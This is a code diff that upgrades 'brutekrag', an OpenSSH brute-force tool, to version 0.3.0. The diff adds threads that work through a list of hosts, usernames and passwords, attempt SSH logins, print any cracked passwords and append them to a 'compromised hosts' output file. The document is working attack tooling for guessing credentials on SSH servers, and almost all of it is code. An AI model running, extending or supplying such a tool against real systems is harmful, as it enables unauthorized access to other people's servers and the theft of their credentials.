@@ -28,10 +28,69 @@ import sys
 import brutekrag
 import argparse
 from argparse import RawTextHelpFormatter
+import threading
+import signal
+import time
+
+exit_flag = False
+threads = []
+matrix = []
+compromisedHostsBuffer = None
+
+
+def teardown(signal=0):
+    print('Stopping threads...')
+    exit_flag = True
+    try:
+        for t in threads:
+            try:
+                t.stop()
+            except Exception as e:
+                print(e)
+    except Exception as e:
+        print(e)
+    sys.exit(signal)
+
+
+def signal_handler(signal, frame):
+    teardown(0)
 
 
 def print_error(message, *args):
     print('\033[91m\033[1mERROR:\033[0m %s' % message, *args, file=sys.stderr)
+
+
+class brutekragThread(threading.Thread):
+    def __init__(self, threadID, name, **kwargs):
+        super(brutekragThread, self).__init__()
+        self._threadID = threadID
+        self._name = name
+        self._running = True
+
+    def run(self):
+        self.log('Starting thread...')
+        while(matrix and self._running):
+            try:
+                loginAttempt = matrix.pop()
+                btkg = brutekrag.brutekrag(loginAttempt[0], args.port, timeout=args.timeout)
+                if btkg.connect(loginAttempt[1], loginAttempt[2]) is True:
+                    print('\033[37m[%s:%d]\033[0m The password for user \033[1m%s\033[0m is \033[92m\033[1m%s\033[0m' % (loginAttempt[0], args.port, loginAttempt[1], loginAttempt[2]))
+                    if args.output is not None:
+                        print('%s:%d %s:%s' % (loginAttempt[0], args.port, loginAttempt[1], loginAttempt[2]), file=compromisedHostsBuffer)
+                    if args.user is not None:
+                        # This execution aims to a single user, so all the job is done. :D
+                        teardown(0)
+                        break
+            except Exception as ex:
+                print_error(str(ex))
+        self.stop()
+
+    def stop(self):
+        self.log('Stopping...')
+        self._running = False
+
+    def log(self, *args):
+        print(time.ctime(time.time()), self._name, *args)
 
 
 banner = ('''\033[92m      _                _       _
@@ -40,10 +99,11 @@ banner = ('''\033[92m      _                _       _
      | '_ \| '__| | | | __/ _ \ |/ / '__/ _` |/ _` |
      | |_) | |  | |_| | ||  __/   <| | | (_| | (_| |
      |_.__/|_|   \__,_|\__\___|_|\_\_|  \__,_|\__, |
-            \033[0m\033[1mOpenSSH Brute force tool 0.2.1\033[92m     __/ |
+            \033[0m\033[1mOpenSSH Brute force tool 0.3.0\033[92m     __/ |
           \033[0m(c) Copyright 2014 Jorge Matricali\033[92m  |___/\033[0m
           \n''')
 
+signal.signal(signal.SIGINT, signal_handler)
 parser = argparse.ArgumentParser(description=banner,
                                  formatter_class=RawTextHelpFormatter)
 
@@ -57,6 +117,8 @@ parser.add_argument('-p', '--port', type=int, help='Target port (default 22).', 
 parser.add_argument('-u', '--user', type=str, help='Single user bruteforce.')
 parser.add_argument('-P', '--password', type=str, help='Single password bruteforce.')
 parser.add_argument('--timeout', type=int, help='Connection timeout (in seconds, 1 default).', default=1)
+parser.add_argument('--threads', type=int, default=1, help='Total number of threads to use (default 1).')
+parser.add_argument('-o', '--output', type=str, default=None, help='Output file for compromised hosts.')
 
 try:
     args = parser.parse_args()
@@ -114,11 +176,19 @@ elif args.single is None:
     print_error('You must specify a password dictionary.')
     sys.exit(255)
 
+'''
+OUTPUT BUFFER
+'''
+if args.output is not None:
+    try:
+        compromisedHostsBuffer = open(args.output, 'a')
+    except Exception as error:
+        print_error('Can\'t output to %s: %s' % (args.output, str(error)))
+
 
 '''
 BUILD MATRIX
 '''
-matrix = []
 if args.single is not None:
     # Single file
     dictionary = []
@@ -126,7 +196,7 @@ if args.single is not None:
         for line in dictionaryFile:
             dictionary.append(line)
         dictionaryFile.close()
-    print('Loaded %d passwords from %s\n' % (len(dictionary), args.single))
+    print('Loaded %d combinations of username and password from %s\n' % (len(dictionary), args.single))
 
     for line in dictionary:
         username, password = line.split(args.separator)
@@ -143,14 +213,20 @@ else:
             for target in targets:
                 matrix.append([target.strip(), username.strip(), password.strip('\n')])
 
+matrix.reverse()
+print('%d total loggin attemps.' % len(matrix))
+print('Starting %d threads...\n' % args.threads)
 
-print('%d total loggin attemps.\n' % len(matrix))
-for loginAttempt in matrix:
-    try:
-        btkg = brutekrag.brutekrag(loginAttempt[0], args.port, timeout=args.timeout)
-        btkg.connect(loginAttempt[1], loginAttempt[2])
-    except Exception as ex:
-        print_error(str(ex))
+threads = [None]*args.threads
+for nt in range(args.threads):
+    threads[nt] = brutekragThread(nt+1, 'Thread-%d' % (nt+1))
+    threads[nt].daemon = True
+    threads[nt].start()
+
+while(threads):
+    for t in threads:
+        if not t._running:
+            threads.remove(t)
 
 
 print('Bye...')
